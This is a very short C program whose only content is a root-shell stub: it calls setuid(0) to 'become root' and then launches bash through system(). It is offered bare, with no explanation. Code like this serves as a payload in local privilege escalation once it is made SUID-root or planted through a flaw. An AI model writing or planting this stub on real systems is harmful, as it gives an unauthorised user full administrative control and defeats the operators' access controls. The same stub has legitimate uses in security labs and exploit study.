#include <unistd.h>
int main()
{
    // become root
    setuid(0);
    // run bash
    system("bash");
    return 0;
}
